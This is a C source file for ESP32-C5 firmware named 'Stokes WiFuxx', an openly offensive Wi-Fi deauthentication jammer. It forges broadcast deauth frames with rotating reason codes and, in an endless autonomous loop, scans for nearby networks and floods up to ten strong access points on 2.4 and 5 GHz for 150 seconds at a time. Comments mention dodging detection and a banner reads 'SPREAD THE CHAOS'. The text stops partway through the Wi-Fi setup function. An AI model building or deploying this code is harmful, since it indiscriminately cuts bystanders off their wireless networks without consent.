// main.c - Stokes WiFuxx - ESP32-C5 Dual-Band Deauther (OPTIMISED)
// Features: Optimised dualband deauth, OLED display with text intro

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/time.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_timer.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_system.h"
#include "driver/i2c.h"

static const char *TAG = "WiFuxx";

// ==================== OPTIMISED CONFIGURATION ====================
#define AUTO_MODE_ENABLED          1
#define BAD_SIGNAL_THRESHOLD_24    -75        // 2.4GHz threshold
#define BAD_SIGNAL_THRESHOLD_5     -70        // 5GHz needs stronger signal
#define MAX_TARGETS                10
#define AUTO_SCAN_INTERVAL_SEC     25
#define AUTO_ATTACK_DURATION_SEC   150

// Optimised Deauth Parameters
#define BURST_SIZE_24GHZ           25         // 2.4GHz burst size
#define BURST_SIZE_5GHZ            35         // 5GHz needs more frames
#define CHANNEL_SWITCH_DELAY_MS    12         // Optimised delay
#define TARGET_BURST_DELAY_MS      1          
#define BAND_SWITCH_DELAY_MS       5          // Delay between bands
#define CHANNEL_DWELL_MIN_MS       50         // Minimum time on channel
#define CHANNEL_DWELL_MAX_MS       150        // Maximum before switching

// Attack Strategy
#define USE_REASON_ROTATION        1
#define ROTATE_DEAUTH_REASONS      1

// OLED I2C
#define I2C_MASTER_NUM I2C_NUM_0
#define I2C_MASTER_SDA_IO GPIO_NUM_23
#define I2C_MASTER_SCL_IO GPIO_NUM_24
#define I2C_MASTER_FREQ_HZ 400000
#define OLED_ADDR 0x3C
// ======================================================

// Target structure
typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    uint32_t packets_sent;
    bool active;
    int rssi;
} attack_target_t;

// Multi-target list
typedef struct {
    attack_target_t targets[MAX_TARGETS];
    uint16_t count;
} target_list_t;

// Band-specific target lists
typedef struct {
    target_list_t band_24;
    target_list_t band_5;
} dual_band_targets_t;

// Global state
static bool attack_running = false;
static target_list_t auto_targets = {0};
static uint32_t attack_duration = 0;
static uint32_t attack_start_time = 0;
static TaskHandle_t attack_task_handle = NULL;

// Display data
static SemaphoreHandle_t display_mutex = NULL;
typedef struct {
    uint8_t ap_count_24;
    uint8_t ap_count_5;
    char status[16];
    char ssid_list[8][32];
    uint8_t ssid_count;
} display_info_t;
static display_info_t current_display_info = {0};

// ==================== Deauth Reasons ====================
static const uint16_t deauth_reasons[] = {0x0001, 0x0003, 0x0006, 0x0007, 0x0008, 0x000C, 0x000D};
static const uint8_t num_reasons = sizeof(deauth_reasons) / sizeof(deauth_reasons[0]);

// ==================== Forward Declarations ====================
static void oled_draw_char(uint8_t x, uint8_t page, char c);
static void oled_draw_string(uint8_t x, uint8_t page, const char *str);
static void oled_clear_page(uint8_t page);
static void oled_clear_screen(void);
static void oled_write_cmd(uint8_t cmd);
static void oled_write_data(uint8_t data);

// ==================== Minimal SSD1306 Driver ====================
static void i2c_master_init(void) {
    i2c_config_t conf = {
        .mode = I2C_MODE_MASTER,
        .sda_io_num = I2C_MASTER_SDA_IO,
        .scl_io_num = I2C_MASTER_SCL_IO,
        .sda_pullup_en = GPIO_PULLUP_ENABLE,
        .scl_pullup_en = GPIO_PULLUP_ENABLE,
        .master.clk_speed = I2C_MASTER_FREQ_HZ,
    };
    ESP_ERROR_CHECK(i2c_param_config(I2C_MASTER_NUM, &conf));
    ESP_ERROR_CHECK(i2c_driver_install(I2C_MASTER_NUM, conf.mode, 0, 0, 0));
}

static void oled_write_cmd(uint8_t cmd) {
    uint8_t buffer[2] = {0x00, cmd};
    i2c_master_write_to_device(I2C_MASTER_NUM, OLED_ADDR, buffer, 2, pdMS_TO_TICKS(100));
}

static void oled_write_data(uint8_t data) {
    uint8_t buffer[2] = {0x40, data};
    i2c_master_write_to_device(I2C_MASTER_NUM, OLED_ADDR, buffer, 2, pdMS_TO_TICKS(100));
}

static void oled_init(void) {
    i2c_master_init();
    vTaskDelay(pdMS_TO_TICKS(100));
    oled_write_cmd(0xAE);
    oled_write_cmd(0x20);
    oled_write_cmd(0x00);
    oled_write_cmd(0xB0);
    oled_write_cmd(0xC8);
    oled_write_cmd(0x00);
    oled_write_cmd(0x10);
    oled_write_cmd(0x40);
    oled_write_cmd(0x81);
    oled_write_cmd(0xFF);
    oled_write_cmd(0xA1);
    oled_write_cmd(0xA6);
    oled_write_cmd(0xA8);
    oled_write_cmd(0x3F);
    oled_write_cmd(0xA4);
    oled_write_cmd(0xD3);
    oled_write_cmd(0x00);
    oled_write_cmd(0xD5);
    oled_write_cmd(0xF0);
    oled_write_cmd(0xD9);
    oled_write_cmd(0x22);
    oled_write_cmd(0xDA);
    oled_write_cmd(0x12);
    oled_write_cmd(0xDB);
    oled_write_cmd(0x20);
    oled_write_cmd(0x8D);
    oled_write_cmd(0x14);
    oled_write_cmd(0xAF);
}

static void oled_clear_screen(void) {
    for (uint8_t page = 0; page < 8; page++) {
        oled_write_cmd(0xB0 + page);
        oled_write_cmd(0x00);
        oled_write_cmd(0x10);
        for (uint8_t col = 0; col < 128; col++) {
            oled_write_data(0x00);
        }
    }
}

// Simple text intro - displays for 5 seconds
static void oled_display_text_intro(void) {
    oled_clear_screen();
    
    // Line 0:
    oled_draw_string(0, 0, ">> STOKES WIFUXX");
    
    // Line 1:
    oled_draw_string(0, 1, "Dual-Band Deauth");
    
    // Line 2:
    oled_draw_string(0, 2, "2.4G + 5G Auto");
    
        // Line 3: Attack duration (fits: "Atk:150s" = 9 chars)
    char line5[17];
    snprintf(line5, sizeof(line5), "Atk:%ds", AUTO_ATTACK_DURATION_SEC);
    oled_draw_string(0, 5, line5);
    
    // Line 4:
    oled_draw_string(0, 6, "SOMETIMES YOU...");

    // Line 5:
    oled_draw_string(0, 6, "JUST GOTTA GO AN");
  
    // Line 6:
    oled_draw_string(0, 6, "SPREAD THE CHAOS");
    
    vTaskDelay(pdMS_TO_TICKS(5000));
    oled_clear_screen();
}

static void oled_draw_char(uint8_t x, uint8_t page, char c) {
    if (c < 32 || c > 126) c = 32;
    static const uint8_t font8x8[96][8] = {
        {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
        {0x00,0x00,0x5F,0x00,0x00,0x00,0x00,0x00},
        {0x00,0x07,0x00,0x07,0x00,0x00,0x00,0x00},
        {0x14,0x7F,0x14,0x7F,0x14,0x00,0x00,0x00},
        {0x24,0x2A,0x7F,0x2A,0x12,0x00,0x00,0x00},
        {0x23,0x13,0x08,0x64,0x62,0x00,0x00,0x00},
        {0x36,0x49,0x55,0x22,0x50,0x00,0x00,0x00},
        {0x00,0x05,0x03,0x00,0x00,0x00,0x00,0x00},
        {0x00,0x1C,0x22,0x41,0x00,0x00,0x00,0x00},
        {0x00,0x41,0x22,0x1C,0x00,0x00,0x00,0x00},
        {0x14,0x08,0x3E,0x08,0x14,0x00,0x00,0x00},
        {0x08,0x08,0x3E,0x08,0x08,0x00,0x00,0x00},
        {0x00,0x50,0x30,0x00,0x00,0x00,0x00,0x00},
        {0x08,0x08,0x08,0x08,0x08,0x00,0x00,0x00},
        {0x00,0x60,0x60,0x00,0x00,0x00,0x00,0x00},
        {0x20,0x10,0x08,0x04,0x02,0x00,0x00,0x00},
        {0x3E,0x51,0x49,0x45,0x3E,0x00,0x00,0x00},
        {0x00,0x42,0x7F,0x40,0x00,0x00,0x00,0x00},
        {0x42,0x61,0x51,0x49,0x46,0x00,0x00,0x00},
        {0x21,0x41,0x45,0x4B,0x31,0x00,0x00,0x00},
        {0x18,0x14,0x12,0x7F,0x10,0x00,0x00,0x00},
        {0x27,0x45,0x45,0x45,0x39,0x00,0x00,0x00},
        {0x3C,0x4A,0x49,0x49,0x30,0x00,0x00,0x00},
        {0x01,0x71,0x09,0x05,0x03,0x00,0x00,0x00},
        {0x36,0x49,0x49,0x49,0x36,0x00,0x00,0x00},
        {0x06,0x49,0x49,0x29,0x1E,0x00,0x00,0x00},
        {0x00,0x36,0x36,0x00,0x00,0x00,0x00,0x00},
        {0x00,0x56,0x36,0x00,0x00,0x00,0x00,0x00},
        {0x08,0x14,0x22,0x41,0x00,0x00,0x00,0x00},
        {0x14,0x14,0x14,0x14,0x14,0x00,0x00,0x00},
        {0x00,0x41,0x22,0x14,0x08,0x00,0x00,0x00},
        {0x02,0x01,0x51,0x09,0x06,0x00,0x00,0x00},
        {0x32,0x49,0x79,0x41,0x3E,0x00,0x00,0x00},
        {0x7E,0x11,0x11,0x11,0x7E,0x00,0x00,0x00},
        {0x7F,0x49,0x49,0x49,0x36,0x00,0x00,0x00},
        {0x3E,0x41,0x41,0x41,0x22,0x00,0x00,0x00},
        {0x7F,0x41,0x41,0x22,0x1C,0x00,0x00,0x00},
        {0x7F,0x49,0x49,0x49,0x41,0x00,0x00,0x00},
        {0x7F,0x09,0x09,0x09,0x01,0x00,0x00,0x00},
        {0x3E,0x41,0x49,0x49,0x7A,0x00,0x00,0x00},
        {0x7F,0x08,0x08,0x08,0x7F,0x00,0x00,0x00},
        {0x00,0x41,0x7F,0x41,0x00,0x00,0x00,0x00},
        {0x20,0x40,0x41,0x3F,0x01,0x00,0x00,0x00},
        {0x7F,0x08,0x14,0x22,0x41,0x00,0x00,0x00},
        {0x7F,0x40,0x40,0x40,0x40,0x00,0x00,0x00},
        {0x7F,0x02,0x0C,0x02,0x7F,0x00,0x00,0x00},
        {0x7F,0x04,0x08,0x10,0x7F,0x00,0x00,0x00},
        {0x3E,0x41,0x41,0x41,0x3E,0x00,0x00,0x00},
        {0x7F,0x09,0x09,0x09,0x06,0x00,0x00,0x00},
        {0x3E,0x41,0x51,0x21,0x5E,0x00,0x00,0x00},
        {0x7F,0x09,0x19,0x29,0x46,0x00,0x00,0x00},
        {0x46,0x49,0x49,0x49,0x31,0x00,0x00,0x00},
        {0x01,0x01,0x7F,0x01,0x01,0x00,0x00,0x00},
        {0x3F,0x40,0x40,0x40,0x3F,0x00,0x00,0x00},
        {0x1F,0x20,0x40,0x20,0x1F,0x00,0x00,0x00},
        {0x3F,0x40,0x38,0x40,0x3F,0x00,0x00,0x00},
        {0x63,0x14,0x08,0x14,0x63,0x00,0x00,0x00},
        {0x07,0x08,0x70,0x08,0x07,0x00,0x00,0x00},
        {0x61,0x51,0x49,0x45,0x43,0x00,0x00,0x00},
        {0x00,0x7F,0x41,0x41,0x00,0x00,0x00,0x00},
        {0x02,0x04,0x08,0x10,0x20,0x00,0x00,0x00},
        {0x00,0x41,0x41,0x7F,0x00,0x00,0x00,0x00},
        {0x04,0x02,0x01,0x02,0x04,0x00,0x00,0x00},
        {0x40,0x40,0x40,0x40,0x40,0x00,0x00,0x00},
        {0x00,0x01,0x02,0x04,0x00,0x00,0x00,0x00},
        {0x20,0x54,0x54,0x54,0x78,0x00,0x00,0x00},
        {0x7F,0x48,0x44,0x44,0x38,0x00,0x00,0x00},
        {0x38,0x44,0x44,0x44,0x20,0x00,0x00,0x00},
        {0x38,0x44,0x44,0x48,0x7F,0x00,0x00,0x00},
        {0x38,0x54,0x54,0x54,0x18,0x00,0x00,0x00},
        {0x08,0x7E,0x09,0x01,0x02,0x00,0x00,0x00},
        {0x0C,0x52,0x52,0x52,0x3E,0x00,0x00,0x00},
        {0x7F,0x08,0x04,0x04,0x78,0x00,0x00,0x00},
        {0x00,0x44,0x7D,0x40,0x00,0x00,0x00,0x00},
        {0x20,0x40,0x44,0x3D,0x00,0x00,0x00,0x00},
        {0x7F,0x10,0x28,0x44,0x00,0x00,0x00,0x00},
        {0x00,0x41,0x7F,0x40,0x00,0x00,0x00,0x00},
        {0x7C,0x04,0x18,0x04,0x78,0x00,0x00,0x00},
        {0x7C,0x08,0x04,0x04,0x78,0x00,0x00,0x00},
        {0x38,0x44,0x44,0x44,0x38,0x00,0x00,0x00},
        {0x7C,0x14,0x14,0x14,0x08,0x00,0x00,0x00},
        {0x08,0x14,0x14,0x18,0x7C,0x00,0x00,0x00},
        {0x7C,0x08,0x04,0x04,0x08,0x00,0x00,0x00},
        {0x48,0x54,0x54,0x54,0x20,0x00,0x00,0x00},
        {0x04,0x3F,0x44,0x40,0x20,0x00,0x00,0x00},
        {0x3C,0x40,0x40,0x20,0x7C,0x00,0x00,0x00},
        {0x1C,0x20,0x40,0x20,0x1C,0x00,0x00,0x00},
        {0x3C,0x40,0x30,0x40,0x3C,0x00,0x00,0x00},
        {0x44,0x28,0x10,0x28,0x44,0x00,0x00,0x00},
        {0x0C,0x50,0x50,0x50,0x3C,0x00,0x00,0x00},
        {0x44,0x64,0x54,0x4C,0x44,0x00,0x00,0x00},
        {0x00,0x08,0x36,0x41,0x00,0x00,0x00,0x00},
        {0x00,0x00,0x7F,0x00,0x00,0x00,0x00,0x00},
        {0x00,0x41,0x36,0x08,0x00,0x00,0x00,0x00},
        {0x10,0x08,0x10,0x08,0x00,0x00,0x00,0x00},
    };
    const uint8_t *glyph = font8x8[c - 32];
    oled_write_cmd(0xB0 + page);
    oled_write_cmd(0x00 + (x & 0x0F));
    oled_write_cmd(0x10 + ((x >> 4) & 0x0F));
    for (uint8_t i = 0; i < 8; i++) {
        oled_write_data(glyph[i]);
    }
}

static void oled_draw_string(uint8_t x, uint8_t page, const char *str) {
    while (*str && x < 128) {
        oled_draw_char(x, page, *str);
        x += 8;
        str++;
    }
}

static void oled_clear_page(uint8_t page) {
    oled_write_cmd(0xB0 + page);
    oled_write_cmd(0x00);
    oled_write_cmd(0x10);
    for (uint8_t i = 0; i < 128; i++) {
        oled_write_data(0x00);
    }
}

// ==================== Deauth Frame ====================
typedef struct {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint8_t seq[2];
    uint8_t reason[2];
} __attribute__((packed)) deauth_frame_t;

// ==================== Utility Functions ====================
static uint32_t get_time_sec(void) {
    return (uint32_t)(esp_timer_get_time() / 1000000ULL);
}

static void log_to_all(const char *format, ...) {
    char buffer[256];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    ESP_LOGI(TAG, "%s", buffer);
}

// ==================== Optimised Deauth Functions ====================
static inline void send_deauth_frame(uint8_t *ap_mac, uint16_t reason) {
    static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    deauth_frame_t frame;
    frame.frame_ctrl[0] = 0xC0;
    frame.frame_ctrl[1] = 0x00;
    frame.duration[0] = 0x00;
    frame.duration[1] = 0x00;

    memcpy(frame.da, broadcast, 6);
    memcpy(frame.sa, ap_mac, 6);
    memcpy(frame.bssid, ap_mac, 6);

    frame.seq[0] = 0x00;
    frame.seq[1] = 0x00;
    frame.reason[0] = reason & 0xFF;
    frame.reason[1] = (reason >> 8) & 0xFF;

    esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
}

// Optimised band-specific attack
static void attack_band(target_list_t *list, uint8_t burst_size, bool is_5ghz) {
    if (list->count == 0) return;
    
    // Group channels for this band
    uint8_t channels[14] = {0};
    uint8_t num_channels = 0;
    
    for (int i = 0; i < list->count; i++) {
        uint8_t ch = list->targets[i].channel;
        bool found = false;
        for (int j = 0; j < num_channels; j++) {
            if (channels[j] == ch) { found = true; break; }
        }
        if (!found && num_channels < 14) {
            channels[num_channels++] = ch;
        }
    }
    
    // Attack each channel in this band
    for (int c = 0; c < num_channels; c++) {
        esp_wifi_set_channel(channels[c], WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));
        
        // Find targets on this channel
        for (int t = 0; t < list->count; t++) {
            attack_target_t *target = &list->targets[t];
            if (!target->active || target->channel != channels[c]) continue;
            
            // Send burst with rotating reason codes
            for (int i = 0; i < burst_size; i++) {
                uint16_t reason;
                if (USE_REASON_ROTATION) {
                    reason = deauth_reasons[i % num_reasons];
                } else {
                    static const uint16_t reasons[] = {0x0001, 0x0003, 0x0006, 0x0007, 0x0008};
                    reason = reasons[i % 5];
                }
                send_deauth_frame(target->bssid, reason);
                target->packets_sent++;
                
                // Small variance in timing to avoid detection
                if (i % 5 == 4 && is_5ghz) {
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
            }
            vTaskDelay(pdMS_TO_TICKS(TARGET_BURST_DELAY_MS));
        }
    }
}

// ==================== Optimised Multi-Band Attack Task ====================
static void multi_band_attack_task(void *pvParameters) {
    log_to_all("");
    log_to_all("╔════════════════════════════════════════╗");
    log_to_all("║        STOKES WIFUXX OPTIMISED         ║");
    log_to_all("║        DUAL-BAND ATTACK ACTIVE         ║");
    log_to_all("╚════════════════════════════════════════╝");

    // Separate targets by band
    target_list_t targets_24 = {0};
    target_list_t targets_5 = {0};
    
    for (int i = 0; i < auto_targets.count; i++) {
        if (auto_targets.targets[i].channel <= 14) {
            targets_24.targets[targets_24.count++] = auto_targets.targets[i];
        } else {
            targets_5.targets[targets_5.count++] = auto_targets.targets[i];
        }
    }
    
    log_to_all("📡 2.4GHz Targets: %d", targets_24.count);
    for (int i = 0; i < targets_24.count; i++) {
        log_to_all("   [%d] %s (CH %d, RSSI %d)", i, targets_24.targets[i].ssid, 
                   targets_24.targets[i].channel, targets_24.targets[i].rssi);
    }
    
    log_to_all("📡 5GHz Targets: %d", targets_5.count);
    for (int i = 0; i < targets_5.count; i++) {
        log_to_all("   [%d] %s (CH %d, RSSI %d)", i, targets_5.targets[i].ssid,
                   targets_5.targets[i].channel, targets_5.targets[i].rssi);
    }
    
    log_to_all("⏱️  Attack duration: %lu seconds", attack_duration);
    log_to_all("🔥 Mode: OPTIMISED DUAL-BAND RAPID");
    log_to_all("");

    // Update display status
    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        strcpy(current_display_info.status, "ATTACK");
        xSemaphoreGive(display_mutex);
    }

    attack_start_time = get_time_sec();
    uint32_t last_log_time = 0;
    uint32_t cycle_count = 0;
    
    // Reset packet counters
    for (int i = 0; i < auto_targets.count; i++) {
        auto_targets.targets[i].packets_sent = 0;
    }

    log_to_all("💥 DUAL-BAND ATTACK STARTED!");
    log_to_all("");

    while (attack_running) {
        uint32_t elapsed = get_time_sec() - attack_start_time;
        if (elapsed >= attack_duration) {
            log_to_all("⏰ Attack duration expired!");
            break;
        }
        
        // Attack 2.4GHz band
        if (targets_24.count > 0) {
            attack_band(&targets_24, BURST_SIZE_24GHZ, false);
            vTaskDelay(pdMS_TO_TICKS(BAND_SWITCH_DELAY_MS));
        }
        
        // Attack 5GHz band (more aggressive burst)
        if (targets_5.count > 0) {
            attack_band(&targets_5, BURST_SIZE_5GHZ, true);
            vTaskDelay(pdMS_TO_TICKS(BAND_SWITCH_DELAY_MS));
        }
        
        cycle_count++;
        
        // Update display with packet counts periodically
        if (elapsed - last_log_time >= 2) {
            last_log_time = elapsed;
            uint32_t remaining = attack_duration - elapsed;
            
            uint32_t total_packets_24 = 0;
            for (int i = 0; i < targets_24.count; i++) {
                total_packets_24 += targets_24.targets[i].packets_sent;
            }
            
            uint32_t total_packets_5 = 0;
            for (int i = 0; i < targets_5.count; i++) {
                total_packets_5 += targets_5.targets[i].packets_sent;
            }
            
            uint32_t total_packets = total_packets_24 + total_packets_5;
            float total_pps = (float)total_packets / (float)(elapsed > 0 ? elapsed : 1);
            
            log_to_all("💥 [%2lu/%2lu sec] Total: %6lu pkt | PPS: %4.0f | Cycles: %lu | Remaining: %2lu sec",
                     elapsed, attack_duration, total_packets, total_pps, cycle_count, remaining);
            
            if (targets_24.count > 0) {
                float pps_24 = (float)total_packets_24 / (float)(elapsed > 0 ? elapsed : 1);
                log_to_all("   ☠️ 2.4GHz: %6lu pkt (%4.0f pps) - %d targets", 
                         total_packets_24, pps_24, targets_24.count);
            }
            
            if (targets_5.count > 0) {
                float pps_5 = (float)total_packets_5 / (float)(elapsed > 0 ? elapsed : 1);
                log_to_all("   ☠️ 5GHz:   %6lu pkt (%4.0f pps) - %d targets",
                         total_packets_5, pps_5, targets_5.count);
            }
            log_to_all("");
            
            // Update OLED display
            if (display_mutex && (elapsed % 4 < 2)) {
                xSemaphoreTake(display_mutex, portMAX_DELAY);
                current_display_info.ap_count_24 = targets_24.count;
                current_display_info.ap_count_5 = targets_5.count;
                snprintf(current_display_info.status, sizeof(current_display_info.status), 
                        "ATK %lus", remaining);
                xSemaphoreGive(display_mutex);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    log_to_all("");
    log_to_all("╔════════════════════════════════════════╗");
    log_to_all("║            ATTACK COMPLETED            ║");
    log_to_all("╚════════════════════════════════════════╝");

    uint32_t total_time = get_time_sec() - attack_start_time;
    uint32_t total_packets_24 = 0, total_packets_5 = 0;
    
    for (int i = 0; i < targets_24.count; i++) {
        total_packets_24 += targets_24.targets[i].packets_sent;
    }
    for (int i = 0; i < targets_5.count; i++) {
        total_packets_5 += targets_5.targets[i].packets_sent;
    }
    
    uint32_t total_packets = total_packets_24 + total_packets_5;
    float avg_pps = (float)total_packets / (float)(total_time > 0 ? total_time : 1);
    
    log_to_all("📊 FINAL STATISTICS:");
    log_to_all("   Total packets: %lu", total_packets);
    log_to_all("   Total time: %lu seconds", total_time);
    log_to_all("   Average PPS: %.0f packets/sec", avg_pps);
    log_to_all("");
    log_to_all("☠️ 2.4GHz Total: %lu packets (%.0f pps) across %d targets", 
             total_packets_24, (float)total_packets_24/total_time, targets_24.count);
    log_to_all("☠️ 5GHz Total:   %lu packets (%.0f pps) across %d targets",
             total_packets_5, (float)total_packets_5/total_time, targets_5.count);
    
    // Effectiveness rating
    const char* rating;
    if (avg_pps > 1000) rating = "DEVASTATING!";
    else if (avg_pps > 700) rating = "EXCELLENT";
    else if (avg_pps > 400) rating = "GOOD";
    else rating = "MODERATE";
    
    log_to_all("");
    log_to_all("💪 Effectiveness: %s", rating);

    attack_running = false;

    // Update display status
    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        strcpy(current_display_info.status, "IDLE");
        xSemaphoreGive(display_mutex);
    }

    attack_task_handle = NULL;
    vTaskDelete(NULL);
}

static bool start_multi_band_attack(uint32_t duration) {
    if (attack_running) {
        log_to_all("⚠️  Attack already running");
        return false;
    }
    if (auto_targets.count == 0) {
        log_to_all("⚠️  No targets selected");
        return false;
    }
    attack_duration = duration;
    attack_running = true;
    xTaskCreate(multi_band_attack_task, "multi_band_attack", 8192, NULL, 5, &attack_task_handle);
    return true;
}

// ==================== Scan and Filter ====================
static uint16_t scan_and_filter_targets(void) {
    wifi_scan_config_t scan_config = {
        .ssid = 0,
        .bssid = 0,
        .channel = 0,
        .show_hidden = true
    };

    log_to_all("🔍 Scanning for networks...");
    esp_err_t err = esp_wifi_scan_start(&scan_config, true);
    if (err != ESP_OK) {
        log_to_all("❌ Scan failed: %d", err);
        return 0;
    }

    uint16_t ap_num = 0;
    esp_wifi_scan_get_ap_num(&ap_num);
    log_to_all("✅ Found %d total networks", ap_num);

    wifi_ap_record_t *ap_info = calloc(ap_num, sizeof(wifi_ap_record_t));
    if (!ap_info) return 0;
    esp_wifi_scan_get_ap_records(&ap_num, ap_info);

    auto_targets.count = 0;
    memset(&auto_targets.targets, 0, sizeof(auto_targets.targets));
    
    uint8_t count_24 = 0, count_5 = 0;

    log_to_all("🎯 Targeting APs by band:");
    log_to_all("   2.4GHz threshold: > %d dBm", BAD_SIGNAL_THRESHOLD_24);
    log_to_all("   5GHz threshold: > %d dBm", BAD_SIGNAL_THRESHOLD_5);

    for (int i = 0; i < ap_num && auto_targets.count < MAX_TARGETS; i++) {
        int threshold = (ap_info[i].primary <= 14) ? BAD_SIGNAL_THRESHOLD_24 : BAD_SIGNAL_THRESHOLD_5;
        
        if (ap_info[i].rssi > threshold) {
            attack_target_t *t = &auto_targets.targets[auto_targets.count];
            memcpy(t->bssid, ap_info[i].bssid, 6);
            
            // Handle hidden networks - check if SSID is empty
            if (strlen((char*)ap_info[i].ssid) == 0) {
                strcpy(t->ssid, "Hidden");
            } else {
                strncpy(t->ssid, (char*)ap_info[i].ssid, sizeof(t->ssid)-1);
                t->ssid[sizeof(t->ssid)-1] = '\0';
            }
            
            t->channel = ap_info[i].primary;
            t->active = true;
            t->packets_sent = 0;
            t->rssi = ap_info[i].rssi;

            const char *band = (ap_info[i].primary <= 14) ? "2.4GHz" : "5GHz";
            if (ap_info[i].primary <= 14) count_24++;
            else count_5++;
            
            log_to_all("  [%d] %s (CH: %d, %s, RSSI: %d, MAC: %02x:%02x:%02x:%02x:%02x:%02x)",
                     auto_targets.count,
                     t->ssid, t->channel, band, ap_info[i].rssi,
                     t->bssid[0], t->bssid[1], t->bssid[2],
                     t->bssid[3], t->bssid[4], t->bssid[5]);

            auto_targets.count++;
        }
    }

    free(ap_info);
    log_to_all("📊 Selected %d targets (%d on 2.4GHz, %d on 5GHz)", 
             auto_targets.count, count_24, count_5);

    // Update display info with scan results
    display_info_t disp = {
        .ap_count_24 = count_24,
        .ap_count_5 = count_5,
        .ssid_count = (auto_targets.count > 8) ? 8 : auto_targets.count,
    };
    strcpy(disp.status, "SCAN");
    for (int i = 0; i < disp.ssid_count; i++) {
        strncpy(disp.ssid_list[i], auto_targets.targets[i].ssid, 31);
        disp.ssid_list[i][31] = '\0';
    }
    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        memcpy(&current_display_info, &disp, sizeof(display_info_t));
        xSemaphoreGive(display_mutex);
    }

    return auto_targets.count;
}

// ==================== Autonomous Mode Task ====================
static void autonomous_mode_task(void *pvParameters) {
    log_to_all("");
    log_to_all("╔════════════════════════════════════════╗");
    log_to_all("║        STOKES WIFUXX OPTIMISED         ║");
    log_to_all("║        AUTONOMOUS MODE ACTIVE          ║");
    log_to_all("╚════════════════════════════════════════╝");
    log_to_all("📊 2.4GHz threshold: > %d dBm", BAD_SIGNAL_THRESHOLD_24);
    log_to_all("📊 5GHz threshold: > %d dBm", BAD_SIGNAL_THRESHOLD_5);
    log_to_all("🎯 Max targets: %d", MAX_TARGETS);
    log_to_all("⏱️  Scan interval: %d seconds", AUTO_SCAN_INTERVAL_SEC);
    log_to_all("⚡ Attack duration: %d seconds", AUTO_ATTACK_DURATION_SEC);
    log_to_all("🔥 Dual-band optimised mode");
    log_to_all("");

    // Set initial display status
    if (display_mutex) {
        xSemaphoreTake(display_mutex, portMAX_DELAY);
        strcpy(current_display_info.status, "IDLE");
        xSemaphoreGive(display_mutex);
    }

    while (1) {
        uint16_t target_count = scan_and_filter_targets();

        if (target_count > 0) {
            log_to_all("⚡ Starting autonomous attack on %d targets", target_count);
            start_multi_band_attack(AUTO_ATTACK_DURATION_SEC);
            while (attack_running) {
                vTaskDelay(pdMS_TO_TICKS(1000));
            }
        } else {
            log_to_all("😴 No strong signals detected, sleeping %d seconds...", AUTO_SCAN_INTERVAL_SEC);
        }

        log_to_all("⏳ Waiting %d seconds before next scan...", AUTO_SCAN_INTERVAL_SEC);
        vTaskDelay(pdMS_TO_TICKS(AUTO_SCAN_INTERVAL_SEC * 1000));
    }
}

// ==================== Display Task ====================
static void display_task(void *pvParameters) {
    display_info_t info;
    char line_buffer[32];
    uint8_t scroll_index = 0;
    const int max_ssid_lines = 5;

    // Show text intro first (5 seconds)
    oled_display_text_intro();

    while (1) {
        if (display_mutex) {
            xSemaphoreTake(display_mutex, portMAX_DELAY);
            memcpy(&info, &current_display_info, sizeof(display_info_t));
            xSemaphoreGive(display_mutex);
        }

        // Row 0: title
        oled_draw_string(0, 0, "Stokes WiFuxx");

        // Row 1: AP counts by band
        snprintf(line_buffer, sizeof(line_buffer), "2.4G:%d 5G:%d", info.ap_count_24, info.ap_count_5);
        oled_clear_page(1);
        oled_draw_string(0, 1, line_buffer);

        // Row 2: status
        snprintf(line_buffer, sizeof(line_buffer), "%s", info.status);
        oled_clear_page(2);
        oled_draw_string(0, 2, line_buffer);

        // Rows 3-7: SSID list
        int start = 0;
        if (info.ssid_count > max_ssid_lines) {
            scroll_index = (scroll_index + 1) % (info.ssid_count);
            start = scroll_index;
        } else {
            scroll_index = 0;
        }

        for (int row = 3; row <= 7; row++) {
            oled_clear_page(row);
        }

        for (int i = 0; i < max_ssid_lines && (start + i) < info.ssid_count; i++) {
            const char *ssid = info.ssid_list[start + i];
            int len = strlen(ssid);
            if (len > 16) len = 16;
            strncpy(line_buffer, ssid, len);
            line_buffer[len] = '\0';
            oled_draw_string(0, 3 + i, line_buffer);
        }

        vTaskDelay(pdMS_TO_TICKS(1000));
    }
}

// ==================== Wi-Fi Initialisation ====================
static void wifi_init_sta(void) {
    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);

    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    // Enable promiscuous mode
    esp_err_t ret = esp_wifi_set_promiscuous(true);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to enable promiscuous mode: %s", esp_err_to_name(ret));
    }

    log_to_all("");
    log_to_all("╔════════════════════════════════════════╗");
    log_to_all("║             STOKES WIFUXX              ║");
    log_to_all("║      OPTIMISED DUAL-BAND DEAUTHER      ║");
    log_to_all("╚════════════════════════════════════════╝");
    log_to_all("📡 Wi-Fi in STA mode with promiscuous");
    log_to_all("⚡ Mode: OPTIMISED AUTONOMOUS");
    log_to_all("📊 2.4GHz threshold: > %d dBm", BAD_SIGNAL_THRESHOLD_24);
    log_to_all("📊 5GHz threshold: > %d dBm", BAD_SIGNAL_THRESHOLD_5);
